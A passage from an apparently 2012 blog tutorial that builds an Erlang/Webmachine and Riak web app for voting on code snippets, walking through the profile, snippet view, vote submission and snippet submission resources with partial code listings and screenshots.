<p>Here you can see that we&rsquo;re getting the id of the user from the URI. From the browser we&rsquo;re hitting this resource via a URI which takes the form of <code>/userdetail/&lt;user-id&gt;</code>, so we access the request data and pull the id out from the path information.</p>

<p>The next bit of code needs a bit of background information. When a user views a profile page the goal was to render the user&rsquo;s name on screen. If a user goes to their own profile page it makes more sense to not render the user&rsquo;s name but instead make it more personal. To do this we pass in the Twitter name of the current user as well as the user that is being viewed back to the JavaScript that made the call to the resource. If those values are the same then the view can be rendered differently.</p>

<p>As a result there was a need to find out who is viewing the page. So what we do is access the authentication information in the request and directly pattern match against the <code>UserId</code> that we pulled from the URI. If we get a match, then we return the name of the current user directly. This means that we can avoid going to the database as we already know the name, but if the user being viewed is different we go to Riak to pull out the name of the user.</p>

<p>Once we have the user name, we then list all the snippets for the user and combine those two bits information into a blob of JSON before returning this to the browser.</p>

<p>So now that the browser has the payload it can render the view that we saw above, including links to the snippets. What happens when a snippet is viewed? Let&rsquo;s a look now.</p>

<h2><a id="snippet-view"></a>Snippet View</h2>

<p>Snippet viewing is the most interesting part of the site so far (in my opinion). So before we dive into the code, let&rsquo;s see what it looks like when we open a snippet.</p>

<p><img src="http://buffered.io/uploads/2012/07/part5-snippet-view.png" title="'The Snippet View'" ></p>

<p>Hopefully this screenshot will finally give you a vivid image as to what this application is all about. A snippet has two sides which do similar things in slightly different wants. Votes are cast by the users of the site to indicate which option they prefer. At the bottom you can see the current tally of votes, the side with the most votes is rendered in green and the side with the least is rendered in red. Both sides are rendered in blue if the the vote count is even.</p>

<p>When a user has voted for a given snippet, the view changes to look like this:</p>

<p><img src="http://buffered.io/uploads/2012/07/part5-voted-snippet-view.png" title="'The Voted Snippet View'" ></p>

<p>When the user returns to the same snippet down the track, the view looks like this:</p>

<p><img src="http://buffered.io/uploads/2012/07/part5-voted-snippet-view-return.png" title="'The Voted Snippet View on return'" ></p>

<p>While we&rsquo;re at it, let&rsquo;s take a look at the view when a user is <em>not</em> signed in:</p>

<p><img src="http://buffered.io/uploads/2012/07/part5-snippet-unknown-user.png" title="'The Voted Snippet View on return'" ></p>

<p>As you can see there are a few things going on here:</p>

<ol>
<li>The main content of the snippet has to be loaded.</li>
<li>The count of votes for the snippet has to be loaded.</li>
<li>If the user is not logged in, show the vote count without any buttons which allow the user to vote.</li>
<li>If the user is logged in and hasn&rsquo;t yet voted, show the vote buttons.</li>
<li>Otherwise show the vote buttons.</li>
<li>When the user votes, post a vote to the server, show a confirmation message and update the vote count on screen. When the vote count is updated, the numbers should reflect any additional votes that have been cast while the user has been viewing the page.</li>
</ol>


<p>Let&rsquo;s see what the snippet loading resource looks like (again, with boring stuff ommitted).</p>

<figure class='code'><figcaption><span>apps/csd_web/src/csd_web_snippet_resource.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">content_types_provided</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Types</span> <span class="o">=</span> <span class="p">[</span>
</span><span class='line'>    <span class="p">{</span><span class="s">&quot;application/json&quot;</span><span class="p">,</span> <span class="n">to_json</span><span class="p">}</span>
</span><span class='line'>  <span class="p">],</span>
</span><span class='line'>  <span class="p">{</span><span class="nv">Types</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>Like before we&rsquo;re only providing JSON versions of the content. The client is responsible for the generation and handling of markup.</p>

<figure class='code'><figcaption><span>apps/csd_web/src/csd_web_snippet_resource.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">to_json</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">PathInfo</span> <span class="o">=</span> <span class="nn">wrq</span><span class="p">:</span><span class="n">path_info</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">SnippetKey</span><span class="p">}</span> <span class="o">=</span> <span class="nn">dict</span><span class="p">:</span><span class="n">find</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="nv">PathInfo</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">Snippet</span><span class="p">}</span> <span class="o">=</span> <span class="nn">csd_snippet</span><span class="p">:</span><span class="n">fetch</span><span class="p">(</span><span class="nb">list_to_binary</span><span class="p">(</span><span class="nv">SnippetKey</span><span class="p">)),</span>
</span><span class='line'>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">Count</span><span class="p">}</span> <span class="o">=</span> <span class="k">case</span> <span class="nn">cookie</span><span class="p">:</span><span class="n">load_auth</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">)</span> <span class="k">of</span>
</span><span class='line'>    <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="p">{</span><span class="nv">UserId</span><span class="p">,</span> <span class="p">_,</span> <span class="p">_,</span> <span class="p">_}}</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="nn">csd_vote</span><span class="p">:</span><span class="n">count_for_snippet</span><span class="p">(</span><span class="nv">SnippetKey</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">);</span>
</span><span class='line'>    <span class="p">_</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="nn">csd_vote</span><span class="p">:</span><span class="n">count_for_snippet</span><span class="p">(</span><span class="nv">SnippetKey</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">Json</span> <span class="o">=</span> <span class="nb">iolist_to_binary</span><span class="p">([</span>
</span><span class='line'>      <span class="s">&quot;{</span><span class="se">\&quot;</span><span class="s">snippet</span><span class="se">\&quot;</span><span class="s">:&quot;</span><span class="p">,</span>
</span><span class='line'>      <span class="nn">csd_snippet</span><span class="p">:</span><span class="n">to_json</span><span class="p">(</span><span class="nv">Snippet</span><span class="p">),</span>
</span><span class='line'>      <span class="s">&quot;,</span><span class="se">\&quot;</span><span class="s">count</span><span class="se">\&quot;</span><span class="s">:&quot;</span><span class="p">,</span>
</span><span class='line'>      <span class="nn">csd_vote</span><span class="p">:</span><span class="n">to_json</span><span class="p">(</span><span class="nv">Count</span><span class="p">),</span>
</span><span class='line'>      <span class="s">&quot;}&quot;</span>
</span><span class='line'>    <span class="p">]),</span>
</span><span class='line'>
</span><span class='line'>  <span class="p">{</span><span class="nv">Json</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span></code></pre></td></tr></table></div></figure>


<p>The first part of this function is doing the same thing as with the user profile page. It&rsquo;s getting the Id of the snippet being viewed from the URI, which is in the form <code>/snippet/&lt;snippet-id&gt;</code>. Once this has been extracted, the body of the snippet is pulled out of Riak.</p>

<p>After this we then take a look to see if the user is logged in via the auth cookie. If the user is logged in we invoke the vote counting functionality with the <code>UserId</code> as a parameter so that the map/reduce job can find which side they voted for. If the user isn&rsquo;t known, then the other version of the vote count is executed which doesn&rsquo;t rely on the user&rsquo;s Id.</p>

<p>When these two bits of information have been pulled from Riak we combine them (in a rather rudimentary fashion) into a blob of JSON and return that to the client.</p>

<p>Again it&rsquo;s worth noting that we aren&rsquo;t handling the case where the snippet isn&rsquo;t found (ie. returning a [404][Http404]). We&rsquo;ll be covering this off in a future blog post.</p>

<p>From this blob of JSON the client-side code is able to infer quite a bit and can update the display to show the appropriate views depending on the state of the user and the votes. So how exactly do we handle the submission of a vote? Let&rsquo;s look at that now.</p>

<figure class='code'><figcaption><span>apps/csd_web/src/csd_web_vote_submit_resource.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">record</span><span class="p">(</span><span class="nl">state</span><span class="p">,</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">user_data</span> <span class="o">=</span> <span class="n">undefined</span>
</span><span class='line'>  <span class="p">}).</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">init</span><span class="p">([])</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nl">#state</span><span class="p">{}}.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">allowed_methods</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="o">=</span><span class="nl">#state</span><span class="p">{})</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{[</span><span class="n">&#39;POST&#39;</span><span class="p">],</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>When processing vote submissions we use the user information in more that one of the Webmachine overloads, so rather than pull it out of the auth cookie each time we store it in the <code>State</code> blob that is threaded through each of the functions we overload. The above code declares the record that we&rsquo;re using and shows that for each request we create a new one when the resource is initialised.</p>

<p>The other take-away from this bit of code is that we only accept <code>POST</code>s.</p>

<figure class='code'><figcaption><span>apps/csd_web/src/csd_web_vote_submit_resource.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">is_authorized</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="o">=</span><span class="nl">#state</span><span class="p">{})</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="k">case</span> <span class="nn">cookie</span><span class="p">:</span><span class="n">load_auth</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">)</span> <span class="k">of</span>
</span><span class='line'>    <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">UserData</span><span class="p">}</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="p">{</span><span class="n">true</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="nl">#state</span><span class="p">{</span><span class="n">user_data</span><span class="o">=</span><span class="nv">UserData</span><span class="p">}};</span>
</span><span class='line'>    <span class="p">_</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="p">{</span><span class="n">false</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}</span>
</span><span class='line'>  <span class="k">end</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>Given that we&rsquo;re processing the submission of votes we require that the user is signed in. If a non-authorised request comes in we want to return a [401][Http401]. If the user is signed in, we allow the processing to continue but we also store the user data in <code>State</code> so that it can be used in <code>process_post</code>.</p>

<figure class='code'><figcaption><span>apps/csd_web/src/csd_web_vote_submit_resource.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">process_post</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="o">=</span><span class="nl">#state</span><span class="p">{</span><span class="n">user_data</span><span class="o">=</span><span class="p">{</span><span class="nv">UserId</span><span class="p">,</span> <span class="p">_,</span> <span class="p">_,</span> <span class="p">_}})</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">FormData</span> <span class="o">=</span> <span class="nn">mochiweb_util</span><span class="p">:</span><span class="n">parse_qs</span><span class="p">(</span><span class="nn">wrq</span><span class="p">:</span><span class="n">req_body</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">)),</span>
</span><span class='line'>  <span class="nv">SnippetId</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="s">&quot;snippet&quot;</span><span class="p">,</span> <span class="nv">FormData</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">Which</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="s">&quot;which&quot;</span><span class="p">,</span> <span class="nv">FormData</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">Vote</span> <span class="o">=</span> <span class="nn">csd_vote</span><span class="p">:</span><span class="n">to_vote</span><span class="p">(</span><span class="nv">UserId</span><span class="p">,</span> <span class="nv">SnippetId</span><span class="p">,</span> <span class="nv">Which</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="p">_}</span> <span class="o">=</span> <span class="nn">csd_vote</span><span class="p">:</span><span class="n">save</span><span class="p">(</span><span class="nv">Vote</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">Count</span><span class="p">}</span> <span class="o">=</span> <span class="nn">csd_vote</span><span class="p">:</span><span class="n">count_for_snippet</span><span class="p">(</span><span class="nv">SnippetId</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">Json</span> <span class="o">=</span> <span class="nn">csd_vote</span><span class="p">:</span><span class="n">to_json</span><span class="p">(</span><span class="nv">Count</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">NewReqData</span> <span class="o">=</span> <span class="nn">wrq</span><span class="p">:</span><span class="n">set_resp_header</span><span class="p">(</span><span class="s">&quot;Content-type&quot;</span><span class="p">,</span> <span class="s">&quot;application/json&quot;</span><span class="p">,</span> <span class="nn">wrq</span><span class="p">:</span><span class="n">set_resp_body</span><span class="p">(</span><span class="nv">Json</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">)),</span>
</span><span class='line'>  <span class="p">{</span><span class="n">true</span><span class="p">,</span> <span class="nv">NewReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span></code></pre></td></tr></table></div></figure>


<p>The first thing you&rsquo;ll notice here is that <code>process_post</code> requires a pattern-match against valid <code>user_data</code> to extract the <code>UserId</code>. If it doesn&rsquo;t match the process will crash. This is ok because we shouldn&rsquo;t ever reach this function unless the user is authorised anyway.</p>

<p>The body of the function is made up of a few simple steps. We parse out the content of the <code>POST</code> using <code>parse_qs</code> from Mochiweb&rsquo;s <code>mochiweb_util</code> module and then from that we extract <code>"snippet"</code> and <code>"which"</code> values which indicate the key of the snippet and the side of the snippet the user voted for (respectively). A new vote is then created using the extract form information and the <code>UserId</code> pulled from the authentication cookie.</p>

<p>This new vote is then pushed into Riak via <code>csd_vote:save</code>. You&rsquo;ll notice we&rsquo;re not interested in the content of the result other than making sure that it succeeded (ie. the first part of the return tuple is <code>ok</code>).</p>

<p>To facilitate the requirement that after voting the UI should be not only refreshed with that user&rsquo;s vote it should also contain any other votes that have been cast while the user has been on the page, we make a call to get the count of votes for the snippet. This is what we pass back to the UI so that it can be displayed.</p>

<p>When I first came across the <code>process_post</code> overload in Webmachine I was a little bit confused as to why the return value of the function wasn&rsquo;t the same as others like <code>to_html</code> or <code>to_json</code>. You&rsquo;ll notice that this function instead returns <code>true</code> to indicate that the <code>POST</code> has been processesd, but the setting of the content type and the body is done in a different way. It does actually make sense given that processing posts doesn&rsquo;t fit the same flow as with, say, a <code>GET</code>. The content type that is returned could be anything (including nothing). In our case we&rsquo;re returning JSON, so we use the <code>wrq</code> API to set the content of the response.</p>

<p>When done, we pass in the new request information as part of the return value and Webmachine does the rest. On the client side, the vote submission response is handled by the JavaScript and the vote count is updated inline (with a little animated effect, which I&rsquo;ll show you shortly).</p>

<p>We are now able to submit votes to snippets. That&rsquo;s all well and good, but we need to be able submit snippets before we can vote on them. Let&rsquo;s look at that process now.</p>

<h2><a id="snippet-submission"></a>Code Snippet Submission</h2>

<p>The first thing to note here is that we&rsquo;re going to use a different resource to handle submissions. This is because we want to keep our code clean. Given that we&rsquo;re also going to be handling POSTs on a URI <em>without</em> a snippet key, we can easily handle this in our URI dispatch without having to resort to using guards.</p>

<p>Let&rsquo;s wade through the important bits of <code>csd_web_snippet_submit_resource</code> now.</p>

<figure class='code'><figcaption><span>apps/csd_web/src/csd_web_snippet_submit_resource.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% Internal Record Definitions</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">record</span><span class="p">(</span><span class="nl">state</span><span class="p">,</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">user_data</span> <span class="o">=</span> <span class="n">undefined</span><span class="p">,</span>
</span><span class='line'>    <span class="n">key</span>
</span><span class='line'>  <span class="p">}).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">is_authorized</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="o">=</span><span class="nl">#state</span><span class="p">{})</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="k">case</span> <span class="nn">cookie</span><span class="p">:</span><span class="n">load_auth</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">)</span> <span class="k">of</span>
</span><span class='line'>    <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">UserData</span><span class="p">}</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="p">{</span><span class="n">true</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="nl">#state</span><span class="p">{</span><span class="n">user_data</span><span class="o">=</span><span class="nv">UserData</span><span class="p">}};</span>
</span><span class='line'>    <span class="p">_</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="p">{</span><span class="n">false</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}</span>
</span><span class='line'>  <span class="k">end</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>When processing snippet submissions there are a few details we need to keep track of along the way. Firstly we need to make sure that the request is authorised, but we&rsquo;ll also need to use that User&rsquo;s information when creating the snippet so rather than process the authorisation cookie twice, we&rsquo;ll carry the detail along as part of the request state.</p>

<p>Secondly we&rsquo;re going to need to create a key for the new snippet since we&rsquo;re handling posts. In a true RESTful fashion, we should return the location of the new snippet in the <code>Location</code> response header. Given that this key is used in two Webmachine overloads we&rsquo;ll keep track of the key as well.</p>

<p>Moving on!</p>

<figure class='code'><figcaption><span>apps/csd_web/src/csd_web_snippet_submit_resource.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">init</span><span class="p">([])</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nl">#state</span><span class="p">{}}.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">content_types_accepted</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="o">=</span><span class="nl">#state</span><span class="p">{})</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Types</span> <span class="o">=</span> <span class="p">[</span>
</span><span class='line'>    <span class="p">{</span><span class="s">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">,</span> <span class="n">process_form</span><span class="p">}</span>
</span><span class='line'>  <span class="p">],</span>
</span><span class='line'>  <span class="p">{</span><span class="nv">Types</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">allowed_methods</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="o">=</span><span class="nl">#state</span><span class="p">{})</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{[</span><span class="n">&#39;POST&#39;</span><span class="p">],</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">post_is_create</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="o">=</span><span class="nl">#state</span><span class="p">{})</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{</span><span class="n">true</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>Those of you more familiar with Webmachine will note that when processing posts you don&rsquo;t actually have to override the <code>content_types_accepted</code> function and can instead simply provide an implementation of <code>process_post</code>. This is fine for when you&rsquo;re not interested in creating resources. But if you are interested in creation of resources, as we are, then we need to take a different path through Webmachine&rsquo;s state machine by implementing <code>post_is_create</code> and returning <code>true</code> as the result. We also need to define a function, which we call <code>process_form</code>, which can be invoked for form posts.</p>

<p>Given that we&rsquo;ve returned <code>true</code> from <code>post_is_create</code>, we also need to provide an implementation for <code>create_path</code>, like so:</p>

<figure class='code'><figcaption><span>apps/csd_web/src/csd_web_snippet_submit_resource.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">create_path</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="o">=</span><span class="nl">#state</span><span class="p">{})</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Key</span> <span class="o">=</span> <span class="nn">csd_riak</span><span class="p">:</span><span class="n">new_key</span><span class="p">(),</span>
</span><span class='line'>  <span class="nv">Path</span> <span class="o">=</span> <span class="s">&quot;/snippet/&quot;</span> <span class="o">++</span> <span class="nb">binary_to_list</span><span class="p">(</span><span class="nv">Key</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{</span><span class="nv">Path</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="nl">#state</span><span class="p">{</span><span class="n">key</span><span class="o">=</span><span class="nv">Key</span><span class="p">}}.</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here you can see that we&rsquo;re generating a new key for the snippet data. We generate a new path, which will contain the location of the new snippet once created, and we also save the key in <code>State</code> so that it can be used later.</p>

<p>Finally, all we need to do is implement <code>process_form</code> which pulls the form apart and stores the snippet data in Riak.</p>

<figure class='code'><figcaption><span>apps/csd_web/src/csd_web_snippet_submit_resource.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">process_form</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="o">=</span><span class="nl">#state</span><span class="p">{})</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="c">% get the detail from the form</span>
</span><span class='line'>  <span class="nv">FormData</span> <span class="o">=</span> <span class="nn">mochiweb_util</span><span class="p">:</span><span class="n">parse_qs</span><span class="p">(</span><span class="nn">wrq</span><span class="p">:</span><span class="n">req_body</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">)),</span>
</span><span class='line'>  <span class="nv">Snippet</span> <span class="o">=</span> <span class="n">to_snippet</span><span class="p">(</span><span class="nv">FormData</span><span class="p">,</span> <span class="nv">State</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">SavedSnippet</span><span class="p">}</span> <span class="o">=</span> <span class="nn">csd_snippet</span><span class="p">:</span><span class="n">save</span><span class="p">(</span><span class="nv">Snippet</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">Key</span> <span class="o">=</span> <span class="nn">csd_snippet</span><span class="p">:</span><span class="n">get_key</span><span class="p">(</span><span class="nv">SavedSnippet</span><span class="p">),</span>
</span><span class='line'>
</span><span class='line'>  <span class="c">% Return the key of the snippet as the payload</span>
</span><span class='line'>  <span class="nv">NewBody</span> <span class="o">=</span> <span class="nn">wrq</span><span class="p">:</span><span class="n">set_resp_body</span><span class="p">(</span><span class="nv">Key</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">NewReqData</span> <span class="o">=</span> <span class="nn">wrq</span><span class="p">:</span><span class="n">set_resp_header</span><span class="p">(</span><span class="s">&quot;Content-type&quot;</span><span class="p">,</span> <span class="s">&quot;text/plain&quot;</span><span class="p">,</span> <span class="nv">NewBody</span><span class="p">),</span>
